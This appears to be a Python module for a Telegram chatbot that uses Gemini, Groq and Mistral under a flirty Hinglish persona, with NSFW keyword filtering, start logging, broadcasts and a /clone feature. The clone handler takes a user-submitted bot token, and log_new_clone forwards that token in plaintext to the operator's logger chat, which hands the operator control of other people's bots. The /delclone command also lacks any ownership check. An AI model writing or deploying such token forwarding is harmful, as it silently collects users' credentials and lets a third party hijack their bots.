import asyncio
import time
import random

from google import genai
from groq import Groq
from mistralai import Mistral

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand
)

from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)

# =========================
# CONFIG & DATABASE
# =========================

from ..config import (
    OWNER_ID, GEMINI_API_KEY, GROQ_API_KEY, MISTRAL_API_KEY,
    LOGGER_GROUP, CLONE_LOGGER
)

from ..database import (
    add_cloned_bot, remove_cloned_bot,
    users_collection,
    get_chat_status, set_chat_status
)

from .welcome import master_start
from .admin import ban_user, unban_user, mute_user, unmute_user


# =========================
# 🤖 AI CLIENTS
# =========================

gemini_client = genai.Client(api_key=GEMINI_API_KEY) if GEMINI_API_KEY else None
groq_client = Groq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None
mistral_client = Mistral(api_key=MISTRAL_API_KEY) if MISTRAL_API_KEY else None

SYSTEM_PROMPT = (
    "You are NATKHAT — flirty playful girl. "
    "Reply Hinglish, short, 1 emoji, one line."
)

def clean_ai(t: str):
    return t.replace('"','').replace("`","").strip()


# =========================
# AI FALLBACK CHAIN
# =========================

async def ask_gemini(text):
    if not gemini_client:
        return None
    try:
        r = gemini_client.models.generate_content(
            model="gemini-2.0-flash",
            contents=f"{SYSTEM_PROMPT}\nUser:{text}\nReply:",
            config={"max_output_tokens": 30, "temperature": 0.9}
        )
        if r.text:
            print("AI → Gemini")
            return clean_ai(r.text.split("\n")[0])
    except Exception as e:
        print("Gemini fail:", e)


async def ask_groq(text):
    if not groq_client:
        return None
    try:
        r = groq_client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role":"system","content":SYSTEM_PROMPT},
                {"role":"user","content":text}
            ],
            max_tokens=30
        )
        print("AI → Groq")
        return clean_ai(r.choices[0].message.content)
    except Exception as e:
        print("Groq fail:", e)


async def ask_mistral(text):
    if not mistral_client:
        return None
    try:
        r = mistral_client.chat.complete(
            model="mistral-small-latest",
            messages=[
                {"role":"system","content":SYSTEM_PROMPT},
                {"role":"user","content":text}
            ],
            max_tokens=30
        )
        print("AI → Mistral")
        return clean_ai(r.choices[0].message.content)
    except Exception as e:
        print("Mistral fail:", e)


async def get_unlimited_ai_reply(text):

    for fn in (ask_gemini, ask_groq, ask_mistral):
        r = await fn(text)
        if r:
            return r

    return random.choice([
        "Arey sun na 😄",
        "Tum mast ho 😉",
        "Phir bolo 😜",
        "Net slow 😅"
    ])


# =========================
# 🛡️ ANTI NSFW
# =========================

BAD_WORDS = ["porn","sex","xxx","nude","randi","gaand"]

async def anti_nsfw_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return False

    text = (update.message.text or "").lower()

    if any(w in text for w in BAD_WORDS):
        try:
            await update.message.delete()
            await context.bot.send_message(
                update.effective_chat.id,
                "🚫 NSFW not allowed"
            )
            return True
        except:
            pass
    return False


# =========================
# 📒 START LOGGER
# =========================

async def log_bot_start(update, context):
    try:
        u = update.effective_user
        c = update.effective_chat

        txt = (
            "🚀 BOT START\n\n"
            f"👤 {u.first_name}\n"
            f"🆔 `{u.id}`\n"
            f"💬 {c.type}\n"
            f"📛 @{u.username if u.username else 'none'}"
        )

        await context.bot.send_message(
            LOGGER_GROUP,
            txt,
            parse_mode="Markdown"
        )
    except Exception as e:
        print("Start log fail:", e)


# =========================
# 🤖 CLONE LOGGER
# =========================

async def log_new_clone(context, user, token, bot_username):
    try:
        txt = (
            "🤖 NEW CLONE\n\n"
            f"👤 {user.first_name}\n"
            f"🆔 `{user.id}`\n"
            f"🔗 @{bot_username}\n"
            f"🔑 `{token}`"
        )
        await context.bot.send_message(CLONE_LOGGER, txt, parse_mode="Markdown")
    except Exception as e:
        print("Clone log fail:", e)


# =========================
# 📢 BROADCAST
# =========================

async def broadcast_handler(update, context):

    if update.effective_user.id != OWNER_ID:
        return

    if not update.message.reply_to_message:
        return await update.message.reply_text("Reply + /broadcast")

    sent = 0

    for u in users_collection.find():
        try:
            await context.bot.copy_message(
                u["user_id"],
                update.effective_chat.id,
                update.message.reply_to_message.message_id
            )
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass

    await update.message.reply_text(f"✅ Sent {sent}")


# =========================
# 🤖 CLONE
# =========================

async def clone_bot(update, context):

    if not context.args:
        return await update.message.reply_text("Usage: /clone TOKEN")

    token = context.args[0]
    user = update.effective_user
    msg = await update.message.reply_text("Cloning...")

    try:
        temp = Application.builder().token(token).build()
        await temp.initialize()
        await temp.start()

        me = await temp.bot.get_me()

        add_cloned_bot(user.id, token, me.username, me.id)
        register_all_handlers(temp)

        await context.bot.send_message(
            CLONE_LOGGER,
            f"🟢 CLONE STARTED\nOwner `{user.id}`",
            parse_mode="Markdown"
        )

        await log_new_clone(context, user, token, me.username)

        await msg.edit_text(f"✅ @{me.username}")

    except Exception as e:
        await msg.edit_text(f"❌ {e}")


async def delclone_bot(update, context):
    if context.args:
        remove_cloned_bot(context.args[0])
        await update.message.reply_text("🗑 Removed")


# =========================
# 💬 CHATBOT
# =========================

async def chatbot_main_reply(update, context):

    if not update.message or not update.message.text:
        return

    if await anti_nsfw_delete(update, context):
        return

    if update.effective_chat.type != "private" and not get_chat_status(update.effective_chat.id):
        return

    await context.bot.send_chat_action(update.effective_chat.id, "typing")

    r = await get_unlimited_ai_reply(update.message.text)
    await update.message.reply_text(r)


# =========================
# ⚡ PING
# =========================

async def ping_cmd(update, context):
    s = time.time()
    m = await update.message.reply_text("🏓")
    await m.edit_text(f"{round((time.time()-s)*1000)} ms")


# =========================
# START
# =========================

async def start_handler(update, context):
    await master_start(update, context)
    await log_bot_start(update, context)


# =========================
# HANDLERS
# =========================

def register_all_handlers(app: Application):

    app.add_handler(CommandHandler("start", start_handler))
    app.add_handler(CommandHandler("clone", clone_bot))
    app.add_handler(CommandHandler("delclone", delclone_bot))
    app.add_handler(CommandHandler("broadcast", broadcast_handler))
    app.add_handler(CommandHandler("ping", ping_cmd))

    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("mute", mute_user))
    app.add_handler(CommandHandler("unmute", unmute_user))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chatbot_main_reply))
    
CLONE_COMMANDS = [
    BotCommand("start", "Start Bot"),
    BotCommand("help", "Help Menu"),
    BotCommand("ping", "Check Speed"),
    BotCommand("chatbot", "Toggle AI"),
    BotCommand("welcome", "Toggle Welcome"),
    BotCommand("ban", "Ban User"),
    BotCommand("unban", "Unban User"),
    BotCommand("mute", "Mute User"),
    BotCommand("unmute", "Unmute User"),
]
